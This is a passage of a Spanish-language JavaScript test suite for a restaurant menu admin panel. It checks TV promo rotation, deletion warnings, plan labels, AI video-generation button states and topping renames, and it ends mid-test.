	test('sin lista guardada se arma desde las columnas de siempre', () => {
		// Es lo que hace tv.html, y las dos lecturas tienen que coincidir: si no,
		// el panel enseñaría una cosa y la pared otra.
		const { ctx, campos } = montar({ promo: { promo_en_tv: true, promo_cada: 6 } });
		ctx.renderTV();
		assert.equal(campos.tvIntercalaPromo.checked, true);
		assert.equal(campos.tvIntercalaMarca.checked, false);
		assert.equal(campos.tvCada.value, '6');
	});

	test('un ritmo raro no deja el selector en blanco', () => {
		const { ctx, campos } = montar({ promo: { promo_cada: 97 } });
		ctx.renderTV();
		assert.equal(campos.tvCada.value, '4');
	});

	// Los avisos miran la TABLA de promociones, no las columnas viejas: desde el
	// 05/09/2026 una promoción puede estar marcada para el televisor sin estarlo
	// para la carta, y al revés.
	test('avisa si todavía no hay ninguna promoción', () => {
		const { ctx, campos } = montar({ promoEnTv: true, promociones: [] });
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvPromoAyuda.textContent, /no has creado ninguna promoción/);
	});

	test('avisa si ninguna está marcada para el televisor', () => {
		const { ctx, campos } = montar({
			promoEnTv: true,
			promociones: [{ id: 'p1', activa: true, en_tv: false }],
		});
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvPromoAyuda.textContent, /Ninguna de tus promociones/);
	});

	test('avisa si las del televisor están apagadas', () => {
		const { ctx, campos } = montar({
			promoEnTv: true,
			promociones: [{ id: 'p1', activa: false, en_tv: true }],
		});
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvPromoAyuda.textContent, /apagadas/);
	});

	test('y con varias dice que se turnan, no que sale "la promoción"', () => {
		// Con cinco promociones, un aviso en singular deja de ser cierto.
		const { ctx, campos } = montar({
			promoEnTv: true,
			promociones: [{ id: 'p1', activa: true, en_tv: true },
			              { id: 'p2', activa: true, en_tv: true }],
		});
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvPromoAyuda.textContent, /2 promociones del televisor se van turnando/);
	});

	test('avisa si se marca el logo sin haberlo subido', () => {
		// La casilla diría que sí y la pantalla saldría sin nada.
		const { ctx, campos } = montar({ marca: { logo: true, frase: '' } });
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvMarcaAyuda.textContent, /no has subido tu logo/);
	});

	test('y si la marca se queda sin logo y sin frase', () => {
		const { ctx, campos } = montar({ marca: { logo: false, frase: '' } });
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvMarcaAyuda.textContent, /Incluye tu logo o escribe una frase/);
	});

	test('elegir el orden solo aparece con dos cosas que ordenar', () => {
		const sola = montar({ promoEnTv: true });
		sola.ctx.tvAlternarIntercalados();
		assert.equal(sola.campos.tvOrdenFila.style.display, 'none');

		const dos = montar({ promoEnTv: true, marca: { logo: true, frase: '' } });
		dos.ctx.tvAlternarIntercalados();
		assert.equal(dos.campos.tvOrdenFila.style.display, 'block');
	});

	// ── LO QUE SE VA A VER, DICHO COMO PASA DE VERDAD ─────────
	// La primera versión dibujaba la secuencia DENTRO de una vuelta y se leía
	// mal en el caso más común: con una sola intercalada por vuelta parecía que
	// la segunda no salía nunca. Sale — en la vuelta siguiente.
	const conSecuencia = (opciones, cuantosPlatos) => {
		const { ctx, campos } = montar(Object.assign({
			promo: { promo_activa: true, promo_imagen_url: 'https://x/p.jpg',
			         logo_url: 'https://x/l.png' },
			productos: Array.from({ length: cuantosPlatos }, (_, i) => ({
				id: 'p' + i, nombre: 'P' + i, disponible: true,
				imagen_url: 'https://x/' + i + '.jpg', categoria_id: 'c1' })),
		}, opciones));
		ctx.renderTV();
		return campos.tvSecuencia.textContent;
	};

	const LAS_DOS = [{ tipo: 'promocion' }, { tipo: 'marca', logo: true, frase: '' }];

	test('con una sola, se dice cada cuánto sale', () => {
		const t = conSecuencia({ guardado: { por_slide: 1, cada: 2,
			intercalados: [{ tipo: 'promocion' }] } }, 4);
		assert.match(t, /Sale tu promoción cada 2 pantallas/);
	});

	test('si caben las dos en una vuelta, se dice que salen las dos', () => {
		const t = conSecuencia({ guardado: { por_slide: 1, cada: 2, intercalados: LAS_DOS } }, 4);
		assert.match(t, /Cada vuelta salen las 2/);
	});

	test('y si solo cabe una, que se van turnando', () => {
		// El caso que se leía mal: 3 pantallas y una cada 2 = un solo hueco.
		const t = conSecuencia({ guardado: { por_slide: 1, cada: 2, intercalados: LAS_DOS } }, 3);
		assert.match(t, /se van turnando/);
		assert.match(t, /esta vuelta tu promoción, la siguiente tu marca/);
	});

	test('si no cabe ninguna no se promete nada', () => {
		// De eso avisa el resumen, y decirlo dos veces con otras palabras confunde.
		const t = conSecuencia({ guardado: { por_slide: 1, cada: 8, intercalados: LAS_DOS } }, 4);
		assert.equal(t, '');
	});

	test('una promoción apagada no cuenta para la secuencia', () => {
		// La cartelera no le da turno, así que prometerlo sería mentir.
		const { ctx, campos } = montar({
			guardado: { por_slide: 1, cada: 2, intercalados: LAS_DOS },
			promo: { promo_activa: false, promo_imagen_url: 'https://x/p.jpg',
			         logo_url: 'https://x/l.png' },
			productos: [1, 2, 3, 4].map(i => ({ id: 'p' + i, nombre: 'P' + i, disponible: true,
				imagen_url: 'https://x/' + i + '.jpg', categoria_id: 'c1' })),
		});
		ctx.renderTV();
		assert.match(campos.tvSecuencia.textContent, /Sale tu marca cada 2/);
	});

	test('encender "Mi marca" enciende el logo', () => {
		// Encenderlo sin nada dentro era un estado muerto: el interruptor decía
		// que sí y no salía ninguna pantalla.
		const { ctx, campos } = montar({ marca: { logo: false, frase: '' } });
		campos.tvIntercalaMarca.checked = true;
		ctx.tvAlternarMarca();
		assert.equal(campos.tvMarcaLogo.checked, true);
	});

	test('pero no lo reenciende cuando ya hay una frase', () => {
		// Quien quiere la frase sola apaga el logo; no se le puede devolver.
		const { ctx, campos } = montar({ marca: { logo: false, frase: 'Desde 1998' } });
		campos.tvIntercalaMarca.checked = true;
		ctx.tvAlternarMarca();
		assert.equal(campos.tvMarcaLogo.checked, false);
	});

	test('ni al apagar "Mi marca"', () => {
		const { ctx, campos } = montar({ marca: { logo: false, frase: '' } });
		campos.tvIntercalaMarca.checked = false;
		ctx.tvAlternarMarca();
		assert.equal(campos.tvMarcaLogo.checked, false);
	});

	test('el resumen cuenta las pantallas intercaladas en la vuelta', () => {
		// Si no se cuentan, el resumen dice que la vuelta dura menos de lo que
		// dura, y el restaurante calcula mal cuánto tarda en repetirse.
		// Por 'guardado' y no por los campos: renderTV los repinta desde lo
		// guardado, así que ponerlos a mano en el DOM no probaría nada.
		const { ctx, campos } = montar({
			guardado: { por_slide: 1, segundos: 10 },
			promo: { promo_en_tv: true, promo_activa: true,
			         promo_imagen_url: 'https://x/p.jpg', promo_cada: 2 },
		});
		ctx.renderTV();
		// 2 platos con foto, de uno en uno = 2 pantallas + 1 intercalada = 30 s
		assert.match(campos.tvResumen.textContent, /\+ 1 intercalada/);
		assert.match(campos.tvResumen.textContent, /30 s/);
	});

	test('avisa si la promoción no llegaría a salir nunca', () => {
		// Ciclo de 2 pantallas con la promo cada 4: no sale jamás, y con la
		// tele puesta parece que se rompió.
		const { ctx, campos } = montar({
			guardado: { por_slide: 1 },
			promo: { promo_en_tv: true, promo_activa: true,
			         promo_imagen_url: 'https://x/p.jpg', promo_cada: 4 },
		});
		ctx.renderTV();
		assert.match(campos.tvResumen.textContent, /no llegaría a salir nunca/);
	});

	test('la categoría no se guarda si el modo no es por categoría', async () => {
		// Dejar el identificador puesto en modo 'todos' es la ambigüedad que
		// tenía el requerimiento original: dos campos diciendo qué mostrar.
		const { ctx, enviado } = montar({ modo: 'todos', categoria: 'c1' });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.categoria_id, null);
		// .length y no deepEqual con []: el arreglo se construye dentro de la
		// VM, así que su prototipo no es el de aquí y la comparación estricta
		// falla por el prototipo, no por el contenido.
		assert.equal(enviado[0].atributos.tv.productos.length, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('fichaEntornoHtml · la etiqueta de restaurante de prueba', () => {
	// Dos de los nueve son clientes; el resto, demos. La etiqueta es solo eso:
	// no cambia la carta pública, ni los respaldos, ni las estadísticas.
	const { fichaEntornoHtml } = cargar('index.html',
		'function fichaEntornoHtml', 'function estadoPagoHtml');

	test('producción no lleva nada', () => {
		// Son la mayoría de los que importan: llenar la lista de distintivos
		// «Producción» haría que el de «Prueba» dejara de saltar a la vista.
		assert.equal(fichaEntornoHtml({ es_prueba: false }), '');
		assert.equal(fichaEntornoHtml({}), '');
	});

	test('sin fila de facturación tampoco', () => {
		// Siete de los nueve no tienen fila todavía: solo se crea al anotarles
		// un pago o al marcarlos. Sin esto, la lista reventaría al pintarse.
		assert.equal(fichaEntornoHtml(null), '');
		assert.equal(fichaEntornoHtml(undefined), '');
	});

	test('prueba lleva su distintivo', () => {
		const html = fichaEntornoHtml({ es_prueba: true });
		assert.match(html, /esprueba/);
		assert.match(html, /Prueba/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('confirmDelete · borrar una categoría se lleva sus platos', () => {
	// productos.categoria_id es ON DELETE CASCADE: la categoría se lleva por
	// delante todos sus platos, con sus fotos y sus videos. El aviso decía
	// solo "¿seguro que quieres eliminar Entrantes?", y nadie que lea eso
	// espera perder doce platos.
	const borrar = (tipo, id, productos) => {
		const mapa = {
			confirmName:     { textContent: '' },
			confirmArrastre: { textContent: '', style: {} },
		};
		const ctx = cargar('index.html', 'function confirmDelete', 'async function executeDelete', {
			state: { productos, deleteAction: null },
			document: { getElementById: id => mapa[id] },
			openModal() {},
		});
		ctx.confirmDelete(tipo, id, 'Entrantes');
		return mapa.confirmArrastre;
	};

	const P = (id, cat) => ({ id, categoria_id: cat });

	test('avisa de cuántos platos se van con ella', () => {
		const a = borrar('categoria', 'c1', [P('p1','c1'), P('p2','c1'), P('p3','c2')]);
		assert.equal(a.style.display, 'block');
		assert.match(a.textContent, /los 2 platos/);
	});

	test('con un solo plato lo dice en singular', () => {
		// "los 1 platos" es la clase de detalle que hace que un aviso se lea
		// como generado por una máquina y se ignore.
		assert.match(borrar('categoria', 'c1', [P('p1','c1')]).textContent, /el plato que hay dentro/);
	});

	test('una categoría vacía no asusta con nada', () => {
		assert.equal(borrar('categoria', 'c1', [P('p1','c2')]).style.display, 'none');
	});

	test('borrar un producto no arrastra nada', () => {
		assert.equal(borrar('producto', 'p1', [P('p1','c1'), P('p2','c1')]).style.display, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('etiquetaModelo · todos los modelos tienen nombre', () => {
	// Un modelo listado en PLANES y sin etiqueta salía como "undefined" en el
	// resumen del plan. Pasó con 'video': se añadió a los planes y no a la
	// tabla de etiquetas.
	//
	// Se comprueba que la etiqueta no sea el identificador crudo. Los ids van
	// en minúscula y las etiquetas capitalizadas, así que si coinciden es que
	// no hay etiqueta y está devolviendo el respaldo.
	const ctx = cargar('index.html', 'const PLANES = {', 'function renderPlanResumen');

	test('ningún modelo de ningún plan se queda sin etiqueta', () => {
		const modelos = new Set();
		for (const n of ['vitrina', 'pedidos', 'completo', 'video'])
			ctx.planDe({ atributos: { plan: n } }).modelos.forEach(m => modelos.add(m));

		assert.ok(modelos.size >= 5, 'deberían salir los cinco modelos');
		for (const m of modelos)
			assert.notEqual(ctx.etiquetaModelo(m), m, `el modelo "${m}" no tiene etiqueta`);
	});

	test('un modelo desconocido no imprime "undefined"', () => {
		// Si algún día hay un modelo nuevo sin etiqueta, que se lea su nombre
		// interno y no una palabra que no significa nada.
		assert.equal(ctx.etiquetaModelo('loquesea'), 'loquesea');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('trabajoFallidoDe · un video que falló tiene que verse', () => {
	// Un trabajo que muere mientras nadie mira la ficha no aparecía en ningún
	// sitio: el plato se quedaba sin video y sin explicación, y volver a
	// subirlo daba exactamente el mismo error.
	const buscar = (trabajos, productoId = 'p1') => {
		const ctx = cargar('index.html', '// Los trabajos de conversión del restaurante.',
			'let vigilanciaVideo = null;', { state: { trabajosVideo: trabajos } });
		return ctx.trabajoFallidoDe(productoId);
	};
	const T = (id, producto_id, estado, creado_en, error = 'algo') =>
		({ id, producto_id, estado, creado_en, error });

	test('encuentra el fallido de ese plato', () => {
		assert.equal(buscar([T('t1', 'p1', 'error', '2026-08-19')]).id, 't1');
	});

	test('no confunde el de otro plato', () => {
		assert.equal(buscar([T('t1', 'p2', 'error', '2026-08-19')]), null);
	});

	test('los que terminaron bien no son un fallo', () => {
		assert.equal(buscar([T('t1', 'p1', 'listo', '2026-08-19')]), null);
	});

	test('uno en marcha todavía no ha fallado', () => {
		// 'pendiente' y 'procesando' no son un error: el worker aún puede
		// sacarlo adelante y avisar de un fallo que no existe asusta en balde.
		assert.equal(buscar([T('t1', 'p1', 'pendiente', '2026-08-19')]), null);
		assert.equal(buscar([T('t2', 'p1', 'procesando', '2026-08-19')]), null);
	});

	test('con varios fallidos manda el más reciente', () => {
		// El motivo del último es el que explica por qué el plato sigue sin
		// video; el de hace tres días puede ser de otro archivo distinto.
		const r = buscar([
			T('viejo', 'p1', 'error', '2026-08-15', 'formato raro'),
			T('nuevo', 'p1', 'error', '2026-08-19', 'dura 1,4 s'),
		]);
		assert.equal(r.id, 'nuevo');
		assert.match(r.error, /1,4 s/);
	});

	test('sin trabajos cargados no revienta', () => {
		const ctx = cargar('index.html', '// Los trabajos de conversión del restaurante.',
			'let vigilanciaVideo = null;', { state: {} });
		assert.equal(ctx.trabajoFallidoDe('p1'), null);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('estilo del carrete · aspecto sin tocar el funcionamiento', () => {
	// Tres aspectos del mismo modelo vertical. No son plantillas distintas:
	// todo lo que los separa es CSS. Aquí se comprueba lo único que decide el
	// panel — cuándo se ofrece la elección y qué se guarda.
	const conModelo = (nav, estiloSelect, estiloGuardado) => {
		const mapa = {
			apEstiloFila: { style: {} },
			apNavModelo:  { value: nav ?? '' },
			apEstilo:     { value: estiloSelect ?? '' },
		};
		const ctx = cargar('index.html', [
			['function navElegido', 'function aplicarPlanAlPanel'],
		], {
			state: { restaurante: { atributos: { nav, estilo: estiloGuardado } } },
			document: { getElementById: id => mapa[id] },
		});
		return { ctx, mapa };
	};

	test('el estilo solo se ofrece en el modelo vertical', () => {
		// Un control que no hace nada es peor que no tenerlo: quien lo usa cree
		// que está trabajando.
		const { ctx, mapa } = conModelo('vertical');
		ctx.ajustarEstiloAlModelo();
		assert.equal(mapa.apEstiloFila.style.display, 'block');
	});

	test('en los demás modelos ni aparece', () => {
		for (const nav of ['topnav', 'sidebar', 'carrito', 'explorar', 'video']) {
			const { ctx, mapa } = conModelo(nav);
			ctx.ajustarEstiloAlModelo();
			assert.equal(mapa.apEstiloFila.style.display, 'none', `en ${nav}`);
		}
	});

	test('sin elegir nada se guarda el clásico', () => {
		const { ctx } = conModelo('vertical', '', undefined);
		assert.equal(ctx.estiloElegido(), 'clasico');
	});

	test('un desplegable vacío conserva lo que ya tenía', () => {
		// Mismo fallo que costó una carta en video: a un <select> se le asigna
		// un valor que no está entre sus opciones y se queda en cadena vacía.
		// Guardar eso le borraría el estilo a un restaurante que no lo tocó.
		const { ctx } = conModelo('vertical', '', 'avance');
		assert.equal(ctx.estiloElegido(), 'avance');
	});

	test('lo elegido manda sobre lo guardado', () => {
		const { ctx } = conModelo('vertical', 'intenso', 'clasico');
		assert.equal(ctx.estiloElegido(), 'intenso');
	});

	test('el estilo se conserva al pasar por otro modelo', () => {
		// Se guarda siempre, también donde no se usa. Si se borrara al cambiar
		// de modelo, quien pruebe otro y vuelva se encontraría su elección
		// perdida sin haberla tocado.
		const { ctx } = conModelo('topnav', '', 'avance');
		assert.equal(ctx.estiloElegido(), 'avance');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('refrescarCupoIA · no puede pisar ni reencender lo que otro apagó', () => {
	// Estas pruebas existen por un fallo que costó dinero de verdad. El
	// 26/08/2026 un mismo plato se generó DOS veces con 21 segundos de
	// diferencia, y las dos causas estaban aquí:
	//
	//   1. Esta función escribía el aviso de proporción en 'iaEstado', el mismo
	//      elemento donde generarConIA acababa de poner "✨ Generando...". Y se
	//      llama justo después, así que el mensaje bueno desaparecía y en su
	//      sitio quedaba un aviso naranja que se lee como un rechazo.
	//   2. Encendía el botón sin mirar, deshaciendo el apagado que generarConIA
	//      acababa de hacer.
	//
	// Juntas: parece que no salió, y el botón invita a volver a pulsar.

	const pantalla = () => {
		const mapa = {};
		for (const id of ['iaCupo', 'btnGenerarIA', 'iaEncaje', 'iaEstado', 'editProductId',
			// El motivo por el que el botón está apagado, y la previa de la foto:
			// desde que el bloque se ve también sin foto, "hay foto" es una de las
			// condiciones y hay que poder simular las dos.
			'iaMotivo', 'imgEditPreview'])
			mapa[id] = { style: {}, textContent: '', value: '', disabled: false };
		mapa.editProductId.value = 'p1';
		// Con foto por defecto: es el estado en el que estas pruebas ya se
		// escribieron, cuando el bloque solo aparecía habiéndola.
		mapa.imgEditPreview.src = 'https://panel/uploads/productos/a.jpg';
		return mapa;
	};

	const correr = (mapa, { cupo = { disponibles: 20, cupo: 24 }, encaje = null,
	                        generandoIA = null, porAprobar = null, enCurso = null,
	                        productos = [] } = {}) => {
		const ctx = cargar('index.html', 'async function refrescarCupoIA()', 'async function generarConIA()', {
			apiFetch: async () => cupo,
			state: { restaurante: { id: 'r1' }, generandoIA, productos },
			document: { getElementById: id => mapa[id] },
			encajeDeLaFotoActual: () => encaje,
			// Vive en otro trozo del archivo; aquí solo importa que no estorbe.
			reintentarEncajeAlCargarLaFoto: () => {},
			videoPorAprobarDe: () => porAprobar,
			trabajoEnCursoDe: () => enCurso,
		});
		return ctx.refrescarCupoIA();
	};

	test('el aviso de proporción NO toca el elemento del estado', async () => {
		// El fallo exacto: generarConIA deja aquí "✨ Generando..." y esta
		// función lo borraba. Tiene que seguir intacto.
		const m = pantalla();
		m.iaEstado.textContent = '✨ Generando... esto tarda un par de minutos.';

		await correr(m, { encaje: { veredicto: 'avisa', mensaje: 'se recortará el 25%' } });

		assert.equal(m.iaEstado.textContent, '✨ Generando... esto tarda un par de minutos.',
			'el estado de la generación no se toca');
		assert.equal(m.iaEncaje.textContent, 'se recortará el 25%', 'el aviso va en su propio sitio');
	});

	test('con una generación en curso el botón NO se vuelve a encender', async () => {
		const m = pantalla();
		m.btnGenerarIA.disabled = true;
		await correr(m, { generandoIA: 'p1' });
		assert.equal(m.btnGenerarIA.disabled, true, 'hay una en camino: pulsar otra vez la paga dos veces');
	});

	test('pero solo para el plato que la está generando', async () => {
		// El cupo es del restaurante; generar para OTRO plato es legítimo.
		const m = pantalla();
		await correr(m, { generandoIA: 'otro-plato' });
		assert.equal(m.btnGenerarIA.disabled, false);
	});

	test('con la conversión en marcha tampoco', async () => {
		// Cubre el hueco de después: la generación terminó, el trabajo existe y
		// todavía se está convirtiendo. Y esto sí sobrevive a recargar.
		const m = pantalla();
		await correr(m, { enCurso: { id: 't1' } });
		assert.equal(m.btnGenerarIA.disabled, true);
	});

	test('con uno esperando revisión se apaga y se dice por qué', async () => {
		// Pedir otra es pagar por una decisión que todavía no se ha tomado.
		const m = pantalla();
		await correr(m, { porAprobar: { id: 't1' } });
		assert.equal(m.btnGenerarIA.disabled, true);
		// El motivo vive en 'iaMotivo' desde que todos los apagados explican
		// por qué: 'iaEncaje' se queda solo para la proporción de la foto, que
		// es lo único que sabe medir.
		assert.match(m.iaMotivo.textContent, /Publícalo o descártalo/);
	});

	// ── UN BOTÓN APAGADO SIN MOTIVO ES UNA FICHA ROTA ─────────
	// El caso que lo destapó: en "Nuevo producto" se sube la foto, aparece el
	// bloque de IA con el botón vivo y hasta el aviso de la proporción — todo
	// invita a pulsar — y al hacerlo contesta que hay que guardar el plato
	// primero. La interfaz ofrecía algo que no se podía hacer.
	//
	// Ahora cada apagado dice qué falta. Ver docs/planesymodelos.md §4.bis.

	test('sin guardar el plato se apaga y lo explica', async () => {
		const m = pantalla();
		m.editProductId.value = '';
		await correr(m);

		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaMotivo.textContent, /Primero guarda el plato/);
	});

	test('sin foto se apaga y lo explica, en vez de esconder el bloque', async () => {
		// Antes esto ocultaba la IA entera. Esconderla deja al usuario sin
		// saber que existe, y quien pagó el plan tiene que verla.
		const m = pantalla();
		m.imgEditPreview.src = '';
		await correr(m);

		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaMotivo.textContent, /Sube una foto/);
	});

	test('la foto marcada para borrar cuenta como que no hay', async () => {
		// La previa sigue en pantalla hasta guardar, pero quien acaba de
		// quitarla no tiene foto: generar la rechazaría el servidor.
		const m = pantalla();
		const ctx = cargar('index.html', 'async function refrescarCupoIA()', 'async function generarConIA()', {
			apiFetch: async () => ({ disponibles: 20, cupo: 24 }),
			state: { restaurante: { id: 'r1' }, pendingImgUrl: '__remove__', productos: [] },
			document: { getElementById: id => m[id] },
			encajeDeLaFotoActual: () => null,
			reintentarEncajeAlCargarLaFoto: () => {},
			videoPorAprobarDe: () => null,
			trabajoEnCursoDe: () => null,
		});
		await ctx.refrescarCupoIA();

		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaMotivo.textContent, /Sube una foto/);
	});

	test('sin guardar manda sobre sin foto: es lo primero que falta', async () => {
		// El orden de los motivos importa porque solo se enseña el primero, y
		// decirle "sube una foto" a quien además no ha guardado le manda a
		// hacer algo que tampoco le va a servir todavía.
		const m = pantalla();
		m.editProductId.value = '';
		m.imgEditPreview.src = '';
		await correr(m);

		assert.match(m.iaMotivo.textContent, /Primero guarda el plato/);
	});

	// ── CON VIDEO PUESTO, LA ACCIÓN NO ES LA MISMA ────────────

	test('con un video ya puesto el botón dice "Regenerar"', async () => {
		const m = pantalla();
		await correr(m, { productos: [{ id: 'p1', atributos: { video: { url: 'https://x/v.mp4' } } }] });

		assert.match(m.btnGenerarIA.textContent, /Regenerar/);
		assert.equal(m.btnGenerarIA.disabled, false, 'sigue disponible: no se esconde una función del plan');
	});

	test('y avisa de que no pisa el actual hasta publicarlo', async () => {
		// Es la ventaja del flujo de IA sobre subir un video, y hasta ahora no
		// se contaba en ningún sitio.
		const m = pantalla();
		await correr(m, { productos: [{ id: 'p1', atributos: { video: { url: 'https://x/v.mp4' } } }] });

		assert.match(m.iaMotivo.textContent, /sigue en la carta hasta que revises/);
	});

	test('sin video puesto dice "Generar", no "Regenerar"', async () => {
		const m = pantalla();
		await correr(m, { productos: [{ id: 'p1', atributos: {} }] });

		assert.match(m.btnGenerarIA.textContent, /Generar video con IA/);
		assert.doesNotMatch(m.btnGenerarIA.textContent, /Regenerar/);
	});

	test('un archivo elegido y sin subir NO es un video puesto', async () => {
		// Se mira el dato guardado, no la pantalla. Llamarlo "Regenerar" antes
		// de que exista nada sería mentir sobre el estado del plato.
		const m = pantalla();
		await correr(m, { productos: [{ id: 'p1', atributos: {} }] });

		assert.doesNotMatch(m.btnGenerarIA.textContent, /Regenerar/);
	});

	test('con un archivo elegido la IA se aparta, sin desaparecer', async () => {
		// Son dos caminos que compiten por el mismo resultado. Quien ya eligió
		// un archivo tiene una tarea empezada, y ofrecerle generar al lado
		// invita a dejarla a medias — pagando, además.
		const m = pantalla();
		const ctx = cargar('index.html', 'async function refrescarCupoIA()', 'async function generarConIA()', {
			apiFetch: async () => ({ disponibles: 20, cupo: 24 }),
			state: { restaurante: { id: 'r1' }, productos: [] },
			document: { getElementById: id => m[id] },
			encajeDeLaFotoActual: () => ({ veredicto: 'bien', mensaje: '' }),
			reintentarEncajeAlCargarLaFoto: () => {},
			videoPorAprobarDe: () => null,
			trabajoEnCursoDe: () => null,
			videoElegido: { name: 'plato.mp4' },
		});
		await ctx.refrescarCupoIA();

		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaMotivo.textContent, /Termina primero con el video que elegiste/);
	});

	test('sin archivo elegido, la IA sigue disponible', async () => {
		// La guarda de typeof no puede acabar apagando el botón siempre: sin
		// archivo, 'videoElegido' ni existe en este trozo del archivo.
		const m = pantalla();
		await correr(m, { encaje: { veredicto: 'bien', mensaje: '' } });

		assert.equal(m.btnGenerarIA.disabled, false);
	});

	test('el motivo del plato anterior no se queda pegado', async () => {
		// Abrir uno que sí puede generar después de uno que no podía dejaba en
		// pantalla la razón del anterior, que es peor que no decir nada.
		const m = pantalla();
		m.iaMotivo.textContent = 'Primero guarda el plato.';
		await correr(m, { encaje: { veredicto: 'bien', mensaje: '' } });

		assert.equal(m.iaMotivo.textContent, '');
	});

	test('una foto que no sirve apaga el botón', async () => {
		const m = pantalla();
		await correr(m, { encaje: { veredicto: 'rechaza', mensaje: 'sube una foto vertical' } });
		assert.equal(m.btnGenerarIA.disabled, true);
		assert.equal(m.iaEncaje.textContent, 'sube una foto vertical');
	});

	test('sin nada que lo impida, el botón queda vivo y sin avisos', async () => {
		const m = pantalla();
		m.btnGenerarIA.disabled = true;
		await correr(m, { encaje: { veredicto: 'bien', mensaje: '' } });
		assert.equal(m.btnGenerarIA.disabled, false);
		assert.equal(m.iaEncaje.textContent, '');
		assert.match(m.iaCupo.textContent, /quedan 20 de 24/);
	});

	test('sin cupo se apaga, pase lo que pase con la foto', async () => {
		const m = pantalla();
		await correr(m, { cupo: { disponibles: 0, cupo: 24 }, encaje: { veredicto: 'bien', mensaje: '' } });
		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaCupo.textContent, /sin animaciones/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('toppingsHuerfanos · qué platos se quedan colgados al borrar', () => {
	// Desde que los platos guardan el identificador, esto solo puede pasar al
	// BORRAR un elemento del catálogo: renombrarlo ya no los desengancha. Sigue
	// comparando también por nombre porque un plato que nadie haya vuelto a
	// guardar desde la migración todavía puede llevar nombres dentro.
	const buscar = (toppingState, productos) => cargar('toppings.js',
		[['function toppingsHuerfanos', 'async function saveToppings']],
		{ toppingState, state: { productos } }).toppingsHuerfanos();

	const catalogo = {
		platino: [{ id: 't_que', nombre: 'Queso' }],
		premium: [{ id: 't_toc', nombre: 'Tocineta', precio: 3000 }],
		salsas:  [{ id: 't_bbq', nombre: 'BBQ' }],
	};
	const plato = nombre => ({
		nombre, atributos: { personalizacion: { platino: ['t_que'], premium: ['t_toc'], salsas: ['t_bbq'] } },
	});

	test('con el catálogo intacto no avisa de nada', () => {
		// .length y no deepEqual con []: lo que devuelve la función se
		// construye dentro de la VM, así que su Array.prototype no es el de
		// aquí y la comparación estricta falla por el prototipo, no por el
		// contenido.
		assert.equal(buscar(catalogo, [plato('Hamburguesa')]).length, 0);
	});

	test('RENOMBRAR ya no delata a nadie, que es el cambio', () => {
		// Antes esto avisaba de los dos platos y había que volver a marcarlos a
		// mano en cada ficha. El identificador no cambia, así que no se pierde
		// nada y no hay nada que avisar.
		const renombrado = { ...catalogo, premium: [{ id: 't_toc', nombre: 'Tocineta ahumada', precio: 3000 }] };
		assert.equal(buscar(renombrado, [plato('Hamburguesa'), plato('Perro')]).length, 0);
	});

	test('borrar uno sí delata los platos que lo ofrecían', () => {
		const avisos = buscar({ ...catalogo, salsas: [] }, [plato('Hamburguesa'), plato('Perro')]);
		assert.equal(avisos.length, 2, 'los dos platos lo ofrecían');
		assert.match(avisos[0], /Hamburguesa/);
		assert.match(avisos[0], /t_bbq/);
	});

	test('un plato sin migrar, guardado por nombre, también cuenta', () => {
		// Avisar de más es mejor que callarse de menos: mientras quede un plato
		// con nombres, borrar del catálogo tiene que seguir preguntando.
		const porNombre = { nombre: 'Perro', atributos: { personalizacion: { salsas: ['BBQ'] } } };
		assert.equal(buscar(catalogo, [porNombre]).length, 0, 'mientras exista, no estorba');
		const avisos = buscar({ ...catalogo, salsas: [] }, [porNombre]);
		assert.equal(avisos.length, 1);
		assert.match(avisos[0], /BBQ/);
	});

	test('un plato sin personalización no estorba', () => {
		assert.equal(buscar({ ...catalogo, salsas: [] }, [{ nombre: 'Gaseosa', atributos: {} }]).length, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('confirmAddTopping · añadir y renombrar en la pestaña Toppings', () => {
	// Renombrar no se podía hacer desde el panel: solo añadir y borrar,
	// justamente porque renombrar dejaba a los platos apuntando a un nombre
	// que ya no existía. Ahora conserva el identificador, así que es seguro.
	const montar = (toppingState, campos) => {
		const avisos = [];
		const elementos = {};
		const el = id => (elementos[id] ||= { value: '', textContent: '', style: {} });
		for (const [id, v] of Object.entries(campos)) el(id).value = v;

		const ctx = cargar('index.html', [
			['function catalogoDe', '// ── PERSONALIZACIÓN DEL PLATO'],
			['toppings.js', 'const CONTENEDOR_TOPPING', null],
		], {
			toppingState,
			document: { getElementById: el },
			showToast: (m, t) => avisos.push([t, m]),
			openModal: () => {}, closeModal: () => {},
			renderToppingList: () => {},
			state: { productos: [], restaurante: { id: 'r1' } },
			apiFetch: async () => ({}),
			ajustarPestanasAlModelo: () => {},
			confirm: () => true,
			crypto: globalThis.crypto,
		});
		ctx.confirmAddTopping();
		return avisos;
	};

	const nuevoEstado = () => ({
		platino: [{ id: 't_que', nombre: 'Queso' }],
		premium: [{ id: 't_toc', nombre: 'Tocineta', precio: 3000 }],
		salsas:  [],
	});

	test('renombrar CONSERVA el identificador', () => {
		// La prueba que justifica el cambio entero. Si el id cambiara, todos los
		// platos que ofrecen ese topping se quedarían colgados en silencio.
		const st = nuevoEstado();
		montar(st, { toppingTipo: 'platino', toppingIndice: '0', toppingNombre: 'Queso doble' });
		assert.equal(st.platino[0].id, 't_que', 'el identificador no se toca');
		assert.equal(st.platino[0].nombre, 'Queso doble');
		assert.equal(st.platino.length, 1, 'no crea uno nuevo');
	});

	test('renombrar un premium puede cambiarle el precio', () => {
		const st = nuevoEstado();
		montar(st, { toppingTipo: 'premium', toppingIndice: '0', toppingNombre: 'Tocineta', toppingPrecio: '5000' });
